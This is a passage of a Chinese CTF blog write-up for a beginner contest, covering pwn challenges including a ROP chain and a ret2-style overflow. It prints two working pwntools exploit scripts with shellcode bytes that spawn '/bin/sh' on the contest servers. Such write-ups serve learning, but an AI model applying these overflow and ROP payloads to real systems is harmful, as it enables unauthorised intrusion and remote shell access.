Hello_pwn</h3><p>签到题目， <strong>nc 94.191.110.143 20010</strong> 就行</p>\n<p>大吉大利，今晚吃鸡</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209134256269.png\" alt=\"image-20200209134256269\"></p>\n<blockquote>\n<p>flag:  SUSCTF{pwn_1s_s0_ez}</p>\n</blockquote>\n<h3 id=\"0x7-rop-1\"><a href=\"#0x7-rop-1\" class=\"headerlink\" title=\"0x7  rop_1\"></a>0x7  rop_1</h3><p>我还是太弱了呀</p>\n<p>hint没看，想直接解出来，想了半天感觉没有突破口，又觉得萌新赛应该不会很难（走入web死胡同既视感）</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209134512574.png\" alt=\"image-20200209134512574\"></p>\n<p>有system函数，但是没有想要的shellcode，给定的字符串都是const，是不可以改变的，只能另想法子，</p>\n<p>结合题目，就是构建rop链，去找找有没有可用的gadget。</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209134658400.png\" alt=\"image-20200209134658400\"></p>\n<p>漏洞函数其实给得还是非常明显的，read函数</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209135151390.png\" alt=\"image-20200209135151390\"></p>\n<p>最最关键的就是这两个了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209135214383.png\" alt=\"image-20200209135214383\"></p>\n<p>读入信息，写在地址中</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209135242106.png\" alt=\"image-20200209135242106\"></p>\n<p>以及相对应的pop</p>\n<p>但是！！！！！这个pop是反的，所以给数据的时候应该先给地址，再给信息。。。。</p>\n<p>我在这上面死了好久才发现。。剩下的就是套路化操作了</p>\n<p>EXP:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># sh = process('pwd_06807290daabb06d10b26c4bf3806387')</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">'106.54.208.253'</span>, <span class=\"number\">2334</span> )</span><br><span class=\"line\"><span class=\"comment\">#io = process('./fmtstr-')</span></span><br><span class=\"line\">shelf = ELF(<span class=\"string\">'rop'</span>)</span><br><span class=\"line\">shellcode_x86 = <span class=\"string\">\"x31xc9xf7xe1x51x68x2fx2fx73\"</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">\"x68x68x2fx62x69x6ex89xe3xb0\"</span></span><br><span class=\"line\">shellcode_x86 += <span class=\"string\">\"x0bxcdx80\"</span></span><br><span class=\"line\">read_plt = shelf.plt[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">system_plt = shelf.plt[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">memset_plt = shelf.plt[<span class=\"string\">'memset'</span>]</span><br><span class=\"line\">pop_ebp = <span class=\"number\">0x0804938B</span></span><br><span class=\"line\">aBinLs = <span class=\"number\">0x804A008</span></span><br><span class=\"line\">aSUS = <span class=\"number\">0x804C030</span></span><br><span class=\"line\">twopop = <span class=\"number\">0x8049320</span></span><br><span class=\"line\">mov = <span class=\"number\">0x804931D</span></span><br><span class=\"line\">bss = <span class=\"number\">0x0804C028</span></span><br><span class=\"line\">tt= <span class=\"number\">0x0804938B</span></span><br><span class=\"line\">showflag = <span class=\"number\">0x80491B2</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> read_plt</span><br><span class=\"line\"><span class=\"keyword\">print</span> system_plt</span><br><span class=\"line\"><span class=\"comment\"># test = 'a'*76 + p32(showflag)</span></span><br><span class=\"line\">ans =<span class=\"string\">'/bin/sh'</span>+<span class=\"string\">'\\0'</span> * <span class=\"number\">69</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'&gt;\\n'</span>)</span><br><span class=\"line\">final = <span class=\"string\">'/bin/sh\\x00'</span></span><br><span class=\"line\">payload = flat(</span><br><span class=\"line\">[<span class=\"string\">' '</span> * <span class=\"number\">76</span>,read_plt, pop_ebp, bss, system_plt, <span class=\"number\">0xabcdabcd</span>, bss])</span><br><span class=\"line\">apayload = flat(</span><br><span class=\"line\">[ans,system_plt, <span class=\"number\">0xabcdabcd</span>,aBinLs]) </span><br><span class=\"line\">system_add = <span class=\"number\">0x0804C048</span></span><br><span class=\"line\">bpayload = <span class=\"string\">\"A\"</span>*<span class=\"number\">76</span> + p32(twopop)+<span class=\"string\">'/bin'</span> + p32(bss)  + p32(mov) </span><br><span class=\"line\">bpayload +=p32(twopop) +<span class=\"string\">'/sh\\x00'</span>+ p32(bss+<span class=\"number\">4</span>)  + p32(mov) + p32(system_plt)+<span class=\"string\">\"BBBB\"</span>+p32(bss)</span><br><span class=\"line\"><span class=\"comment\"># p32(twopop) + p32(bss+4) +'/sh\\x00' + p32(mov) + </span></span><br><span class=\"line\">sh.sendline(bpayload)</span><br><span class=\"line\">sh.sendline(<span class=\"string\">'/bin/sh'</span>)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>无用信息和注释我都没有删除，就当做教训了，32位只能一个字节一个字节写，。。这个也卡了我一阵子，太丢人了，不配学pwn</p>\n<p>运行得到flag</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209134921764.png\" alt=\"image-20200209134921764\"></p>\n<blockquote>\n<p>flag:  SUSCTF{3nj0y_y0ur_f1rst_R0p}</p>\n</blockquote>\n<h3 id=\"0x8-ret2moon\"><a href=\"#0x8-ret2moon\" class=\"headerlink\" title=\"0x8  ret2moon\"></a>0x8  ret2moon</h3><p>这道题想清楚了，思路其实满清晰的</p>\n<p>通过main函数直接进入关键函数</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209135816812.png\" alt=\"image-20200209135816812\"></p>\n<p>漏洞函数还是read，关键点在利用buf写地址，难点在于第二个read读入长度不够长，没办法实现直接覆盖</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209140851429.png\" alt=\"image-20200209140851429\"></p>\n<p>有现成的system函数可以调用</p>\n<p>方法就是v1写入关键函数地址，将v2的大小定为栈顶到想要调用的函数地址的距离就可以调用了</p>\n<p>EXP：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io = remote(<span class=\"string\">'uns3t.cn'</span>,<span class=\"number\">10004</span>)</span><br><span class=\"line\">payload=<span class=\"string\">'a'</span>*<span class=\"number\">16</span>+p32(<span class=\"number\">0x30</span>+<span class=\"number\">8</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">\"wake\"</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0x00000AE8</span>)</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">\"word\"</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>说真的，我在群里地位绝对是最低的，没有之一，被师傅们疯狂迫害。。。</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209141126074.png\" alt=\"image-20200209141126074\"></p>\n<blockquote>\n<p>flag:  SUSCTF{LMY_has_many_boyfriends}</p>\n</blockquote>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>真的蛮心酸的，萌新赛也打得不亦乐乎，还是我太弱的缘故吧，按照现在这个状况，我可能今后会在ctf上倾斜大量时间了。</p>\n<p>真心感谢师傅们，我觉得这次的萌新赛的题目质量非常好，师傅们也很友善，明年有机会我还会参加。</p>\n","categories":[],"tags":[]}